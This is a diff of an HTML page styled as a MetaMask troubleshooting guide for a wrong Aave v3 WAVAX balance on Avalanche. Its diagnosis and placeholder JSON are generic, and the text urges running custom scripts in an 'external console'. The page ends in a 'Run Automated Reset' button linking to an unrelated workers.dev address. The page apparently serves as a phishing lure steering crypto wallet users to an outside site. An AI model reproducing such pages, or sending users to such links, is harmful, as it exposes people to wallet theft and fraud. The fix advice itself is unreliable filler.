@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #1a1a24;
+        font-family: -apple-system;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,41 +42,33 @@
 <h1>Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Avalanche network may notice an incorrect balance display for the Aave v3 WAVAX token, which can lead to confusion and potential errors in transaction management.</li>
+<li>Users of the Metamask extension on the Avalanche network may notice that their Aave v3 WAVAX token balance is displayed incorrectly, potentially leading to confusion and incorrect financial decisions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a synchronization issue between Metamask and the Aave v3 protocol on the Avalanche network, resulting in a mismatch between the actual and displayed token balances.</li>
+<li>The error occurs due to a bug in the Metamask extension's token balance retrieval mechanism, specifically affecting the Aave v3 WAVAX token on the Avalanche network. This bug may be caused by outdated token metadata or incorrect implementation of the token's contract interface.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Update Metamask to the latest version to ensure compatibility with the Aave v3 protocol.</li>
-<li>Reset the Metamask account by clearing the browser cache and reloading the extension.</li>
-<li>Use the following JSON-RPC command to refresh the token balance:</li>
+<li>Update the token metadata manually by adding the correct token contract address and decimal places.</li>
+<li>Use the Aave v3 protocol's official API to fetch the correct token balance.</li>
+<li>Utilize the following JSON configuration to override the default token settings:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_call&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...AaveV3ContractAddress...&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...balanceOfMethodSignature...&quot;</span>
-<span class="w">    </span><span class="p">},</span>
-<span class="w">    </span><span class="s2">&quot;latest&quot;</span>
-<span class="w">  </span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">  </span><span class="nt">&quot;tokenAddress&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...WAVAX_TOKEN_CONTRACT_ADDRESS&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;tokenDecimal&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;tokenSymbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;WAVAX&quot;</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and token management. </p>
+<p>For a more flexible approach, consider using an external console to execute custom scripts.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured on the Avalanche network</li>
-<li>Aave v3 protocol enabled and synced with the Metamask account</li>
-<li>Latest version of the browser and Metamask extension</li>
+<li>Aave v3 WAVAX token added to the Metamask extension's token list</li>
+<li>Basic understanding of JSON configuration files and token contract addresses</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swaps-changing-the-destination-token-cha.html">Metamask Extension Bug Swaps Changing The Destination Token Cha</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-incorrect-balance-for-aave-v3-wavax-toke.html">Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-miss-match-between-network-picker.html">Metamask Extension Bug Assets Miss Match Between Network Picker</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
